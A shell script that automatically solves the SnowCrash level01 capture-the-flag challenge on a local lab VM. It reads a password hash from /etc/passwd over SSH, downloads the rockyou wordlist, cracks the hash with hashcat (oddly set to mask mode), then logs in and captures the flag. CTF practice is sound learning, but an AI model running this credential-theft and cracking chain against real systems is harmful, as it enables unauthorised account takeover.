#! /usr/bin/env sh

CURR_FILE_PATH="$(realpath "$0")"
CURR_DIR_PATH="$(dirname "$CURR_FILE_PATH")"

#############
### UTILS ###
#############

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

download_rockyou_wordlist() {
    wordlist_dir="$1";
    rockyou_wordlist_url="https://weakpass.com/download/90/rockyou.txt.gz";

    if [ -z "$wordlist_dir" ]; then
        log "Error: download_rockyou_wordlist: missing wordlist directory" >&2;
        return 1;
    fi

    if [ ! -d "$wordlist_dir" ]; then
        log "Error: download_rockyou_wordlist: '$wordlist_dir' is not a directory" >&2;
        return 1;
    fi

    if [ -f "$wordlist_dir/rockyou.txt" ]; then
        echo "$wordlist_dir/rockyou.txt";
        return 0;
    fi

    curl -L "$rockyou_wordlist_url" -o "$wordlist_dir/rockyou.txt.gz" --silent --show-error --fail || return 1;
    gzip -d "$wordlist_dir/rockyou.txt.gz" || return 1;

    echo "$wordlist_dir/rockyou.txt";
}

##############
### DOCKER ###
##############

assert_docker() {
    if ! command -v docker >/dev/null 2>&1; then
        log "Error: the 'docker' command is required. Considering installing the docker from https://docs.docker.com/engine/install.";
        exit 1;
    fi
}

hashcat_crack_hash() {
    assert_docker;

    hash="$1";
    out_dir="$2";
    wordlist_path="$3";

    if [ -z "$hash" ] || [ -z "$out_dir" ] || [ -z "$wordlist_path" ]; then
        log "Error: hashcat_crack_hash: missing arguments. You should provide <hash> <out_dir> <wordlist_path>." >&2;
        return 1;
    fi

    if [ ! -f "$wordlist_path" ]; then
        default_wordlist_url="https://weakpass.com/download/90/rockyou.txt.gz";
        echo "No wordlist found at $wordlist_path. Downloading and extracting the default wordlist: $default_wordlist_url";
        curl -L "$default_wordlist_url" -o "$wordlist_path.gz" --silent --show-error --fail || return 1;
        gzip -d "$wordlist_path.gz" || return 1;
    fi

    docker run --rm -it \
        -v "$wordlist_path:/wordlist.txt:ro" \
        -v "$out_dir:/out:rw" dizcza/docker-hashcat:pocl \
        hashcat --attack-mode 3 --hash-type 1500 "$hash" /wordlist.txt -o /out/cracked.txt >/dev/null 2>&1;
    cracked_password=$(cat "$out_dir/cracked.txt" | cut -d: -f2);
    echo "$cracked_password";
}

###########
### SSH ###
###########

get_ssh_socket_path() {
    fn_name="get_ssh_socket_path";
    socket_name="$1";

    if [ -z "$socket_name" ]; then
        log "Error: ${fn_name}: missing socket name" >&2;
        return 1;
    fi

    echo "${HOME}/.ssh/${socket_name}";
}

init_ssh_socket() {
    fn_name="init_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";
    password="$5";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ] || [ -z "$password" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username> <password>." >&2;
        return 1;
    fi

    if [ -S "$ssh_socket_path" ]; then
            if ssh -S "$ssh_socket_path" -O check "$host" -p "$port" >/dev/null 2>&1; then
                return 0;
            else
                rm -f "$ssh_socket_path";
            fi
    fi

    sshpass -p "$password" ssh -fNMS "$ssh_socket_path" -p "$port" "${username}@${host}"
    return $?;
}

close_ssh_socket() {
    fn_name="close_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    if ! [ -S "$ssh_socket_path" ]; then
        return 0;
    fi

    ssh -S "$ssh_socket_path" -O exit -p "$port" "${username}@${host}";
    exit_code=$?;
    rm -f "$ssh_socket_path";
    return $exit_code;
}

ssh_exec_via_socket() {
    fn_name="ssh_exec_via_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    shift 4;

    if [ $# -eq 0 ]; then
        return 0
    fi

    ssh -S "$ssh_socket_path" -p "$port" "$username@$host" "$@";
    return $?;
}

main() {
    assert_docker;

    host="localhost";
    port="4242";

    level01_socket_path=$(get_ssh_socket_path "snowcrash_level01_socket") || exit 1;
    level01_username="level01";
    level01_password=$(cat "$CURR_DIR_PATH/../../level00/flag");

    flag01_socket_path=$(get_ssh_socket_path "snowcrash_flag01_socket") || exit 1;
    flag01_username="flag01";
    flag01_password="";

    wordlist_path=$(download_rockyou_wordlist "$CURR_DIR_PATH/wordlists" || exit 1);

    trap 'close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username"' EXIT USR1;
    init_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username" "$level01_password" || exit 1;
    hashed_password=$(ssh_exec_via_socket "$level01_socket_path" "$host" "$port" "$level01_username" "cat /etc/passwd | grep ${flag01_username} | cut -d: -f2");
    flag01_password=$(hashcat_crack_hash "$hashed_password"  "$CURR_DIR_PATH/out" "$wordlist_path");
    kill -USR1 $$;

    trap 'close_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username"' EXIT USR1;
    init_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "$flag01_password" || exit 1;
    checkflag_str=$(ssh_exec_via_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "getflag");
    checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
    kill -USR1 $$;

    flag_outpath="$CURR_DIR_PATH/../flag";
    echo "Checkflag: $checkflag";
    echo "$checkflag" > "$flag_outpath";
}

main "$@";
